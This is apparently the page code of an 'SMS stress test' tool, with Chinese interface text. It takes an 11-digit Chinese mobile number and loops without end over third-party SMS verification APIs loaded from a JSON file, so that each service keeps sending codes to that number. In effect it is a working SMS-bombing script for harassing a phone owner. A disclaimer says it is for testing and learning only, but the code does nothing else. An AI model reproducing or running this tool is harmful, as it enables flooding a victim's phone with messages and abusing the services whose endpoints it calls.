     <form id="postForm">

<div class="card">
         <h3>使用方法</h3>
         <p>填写手机号，点击"开始发送"按钮即可发起短信测压<br /><br />本程序仅用于短信测压和学习交流，请勿用于非法用途，使用本程序造成的一切后果由使用者自行承担<br /><br /></p>
     </div>

<script>

  var vConsole = null;
</script>

     <script>

         let apiRequests = [];
         let isSending = false;
         let failureCount = 0;
         const MAX_FAILURES = 10;

         // 从 JSON 文件加载 API
         async function loadAPIs() {
             try {
                 const response = await fetch('api.json');
                 const data = await response.json();
                 
                 // 转换 JSON 格式为代码能用的格式
                 apiRequests = data.map(api => {
                     return {
                         desc: api.desc,
                         url: api.url,
                         method: api.method,
                         headers: () => parseHeaders(api.header),
                         data: (phoneNumber, times) => parseData(api.data, phoneNumber, times)
                     };
                 });
                 
                 logMessage(`✅ 已加载 ${apiRequests.length} 个 API 接口`, 'success');
             } catch (error) {
                 logMessage(`❌ 加载 API 失败: ${error.message}`, 'error');
                 console.error('Failed to load API data:', error);
             }
         }

         // 解析 header
         function parseHeaders(header) {
             if (!header) return {};
             if (typeof header === 'object') return header;
             if (typeof header === 'string') {
                 try {
                     return JSON.parse(header.replace(/'/g, '"'));
                 } catch {
                     return {};
                 }
             }
             return {};
         }

         // 解析 data，替换 [phone] 和 [timestamp]
         function parseData(data, phoneNumber, times) {
             if (!data) return {};
             if (typeof data === 'object') {
                 let result = JSON.parse(JSON.stringify(data));
                 replacePhoneAndTime(result, phoneNumber, times);
                 return result;
             }
             if (typeof data === 'string') {
                 try {
                     let parsed = JSON.parse(data.replace(/'/g, '"'));
                     replacePhoneAndTime(parsed, phoneNumber, times);
                     return parsed;
                 } catch {
                     // 如果是 form-urlencoded 格式
                     return {
                         _raw: data.replace(/\[phone\]/g, phoneNumber).replace(/\[timestamp\]/g, Date.now())
                     };
                 }
             }
             return {};
         }

         function replacePhoneAndTime(obj, phone, times) {
             for (let key in obj) {
                 if (typeof obj[key] === 'string') {
                     obj[key] = obj[key].replace(/\[phone\]/g, phone).replace(/\[timestamp\]/g, Date.now());
                 } else if (typeof obj[key] === 'object' && obj[key] !== null) {
                     replacePhoneAndTime(obj[key], phone, times);
                 }
             }
         }

         async function sendRequests() {
             const phoneNumber = document.getElementById('phoneNumber').value;
             
             if (!phoneNumber || phoneNumber.length !== 11 || !/^1[3-9]\d{9}$/.test(phoneNumber)) {
                 logMessage('❌ 请输入有效的手机号（11位中国手机号）', 'error');
                 return;
             }

             if (!apiRequests || apiRequests.length === 0) {
                 logMessage('❌ API 列表为空，请稍候', 'error');
                 return;
             }

             isSending = true;
             failureCount = 0;
             document.getElementById('sendBtn').style.display = 'none';
             document.getElementById('stopBtn').style.display = 'inline-block';
             
             logMessage(`📱 开始发送短信到 ${phoneNumber}`, 'system');
             logMessage(`📊 共有 ${apiRequests.length} 个接口，开始循环发送`, 'info');

             for (let times = 1; isSending && failureCount < MAX_FAILURES; times++) {
                 for (let api of apiRequests) {
                     if (!isSending) break;
                     await sendSMS(api, phoneNumber, times);
                     await new Promise(resolve => setTimeout(resolve, 200));
                 }
             }

             isSending = false;
             document.getElementById('sendBtn').style.display = 'inline-block';
             document.getElementById('stopBtn').style.display = 'none';
             logMessage('⏹️ 发送已停止', 'system');
         }

         async function sendSMS(api, phoneNumber, times) {
             try {
                 let url = api.url.replace(/\[phone\]/g, phoneNumber).replace(/\[timestamp\]/g, Date.now());

                 const options = {
                     method: api.method || 'GET',
                     headers: api.headers()
                 };

                 if (api.method === 'POST_JSON' || api.method === 'POST') {
                     options.method = 'POST';
                     if (api.method === 'POST_JSON') {
                         options.headers['Content-Type'] = 'application/json';
                         options.body = JSON.stringify(api.data(phoneNumber, times));
                     } else {
                         if (!options.headers['Content-Type']) {
                             options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
                         }
                         const data = api.data(phoneNumber, times);
                         if (data._raw) {
                             options.body = data._raw;
                         } else {
                             options.body = new URLSearchParams(data).toString();
                         }
                     }
                 }

                 const response = await Promise.race([
                     fetch(url, options),
                     new Promise((_, reject) => setTimeout(() => reject(new Error('超时')), 10000))
                 ]);

                 if (response.ok) {
                     logMessage(`✅ ${api.desc} - 成功`, 'success');
                     failureCount = 0;
                 } else {
                     logMessage(`⚠️ ${api.desc} - HTTP ${response.status}`, 'info');
                     failureCount++;
                 }
             } catch (error) {
                 logMessage(`❌ ${api.desc} - ${error.message}`, 'error');
                 failureCount++;

                 if (failureCount >= MAX_FAILURES) {
                     logMessage(`🛑 连续失败 ${failureCount} 次，已自动停止`, 'error');
                     isSending = false;
                 }
             }
         }

         function stopRequests() {
             isSending = false;
             logMessage('⏹️ 已手动停止发送', 'system');
         }

         function logMessage(message, type = 'info') {
             const logArea = document.getElementById('smsLogArea');
             const timestamp = new Date().toLocaleTimeString();
             const span = document.createElement('span');
             span.className = `log-${type}`;
             span.textContent = `[${timestamp}] ${message}`;
             logArea.appendChild(span);
             logArea.appendChild(document.createElement('br'));
             logArea.scrollTop = logArea.scrollHeight;
         }

         // 页面加载时初始化 API
         window.addEventListener('load', () => {
             loadAPIs();
         });

     </script>
